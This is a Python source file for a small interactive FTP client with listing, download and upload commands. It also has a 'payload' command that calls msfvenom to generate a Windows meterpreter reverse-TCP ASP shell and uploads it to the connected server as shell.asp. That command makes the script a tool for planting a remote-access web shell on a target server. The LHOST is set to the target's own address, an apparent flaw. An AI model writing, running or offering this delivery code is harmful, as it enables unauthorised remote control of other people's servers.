#!/usr/bin/python3
import ftplib, linecache, sys, time, os

def login(ftp,user,passw):
    try:        
        ftp.login(user.strip(),passw.strip())
        print("\nType 'q' or 'quit' to quit\n")
        print("List Local Directory: local")
        print("List Host Directory: ls")
        print("Download: download")
        print("Upload file: upload")
        print("Create Payload: payload")
        print("\nCURRENT DIRECTORY:")
        data = []
        ftp.dir(data.append)
        for line in data:
            print("-", line)
    except Exception as e:
        print(e)
        
def process(ftp, os, target):

    loop = True
    command = None
    while loop:
        
        try:

            print ("\nFTP CLIENT -- ENTER 'help' FOR COMMANDS")                                    
            
            print('\n')
            command = input('Enter a command: ')
            print('\n')
            
            if command=='help':
                
                print("\nType 'q' or 'quit' to quit\n")
                print("List Local Directory: local")
                print("List Host Directory: ls")
                print("Download: download")
                print("Upload file: upload")
                print("Create Payload: payload")
            
            elif command=='ls':
                print('\n')
                print(ftp.sendcmd('PWD'))
                print("CURRENT DIRECTORY of " + target + ": " + ftp.sendcmd('PWD'))
                data = []
                ftp.dir(data.append)
                for line in data:
                    print("-", line)  
            
            elif command=='download':
                print("Type 'b' or 'back' to go back")
                filename = input('Enter a filename: ')
                if filename != 'b' and filename != 'back':
                    remotefile = open(filename, 'wb')
                    ftp.retrbinary('RETR ' + filename, remotefile.write, 1024)
                    remotefile.close()
                    
            elif command=='local':
                print('\n')
                print ("LOCAL DIRECTORY: ")
                os.system("dir")             
                    
            elif command=='payload':
                print("Attempting to create payload.")
                print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + target + " LPORT=" + "21" + " -f asp > shell.asp")
                os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + target + " LPORT=" + "21" + " -f asp > shell.asp")
                print('\n')
                print("Payload Created.")
                print('\n')
                print ("LOCAL DIRECTORY: ")
                os.system("dir")
                print('\n')
                print("Attempting to deliver payload.")
                print("STOR shell.asp")
                time.sleep(1)
                file = open("shell.asp","rb")                  # file to send
                ftp.storbinary('STOR shell.asp', file)         # send the file
                print ('\n')
                print ("CURRENT DIRECTORY of " + target + ": " + ftp.sendcmd('PWD'))
                data = []
                ftp.dir(data.append)
                for line in data:
                    print("-", line)  
                print('\n')
                print("Payload Delivered.")
                print('\n')
                
            elif command=='upload':    
                print("Type 'b' or 'back' to go back")
                filename = input('Enter a filename: ')
                if filename != 'b' and filename != 'back':
                    ftp.storbinary('STOR '+filename, open(filename, 'rb'))  
                
            elif command=='q' or command=='quit':
                loop = False      
                
            else:
                print("Command not found.")
                loop = True  
                
        except Exception as e:
            print (str(e))
            pass

def run(hostIP, user, password):
    host=hostIP
    username=user
    passw=password
    ftp=ftplib.FTP(host)
    login(ftp,user,passw)
    process(ftp, os, host)
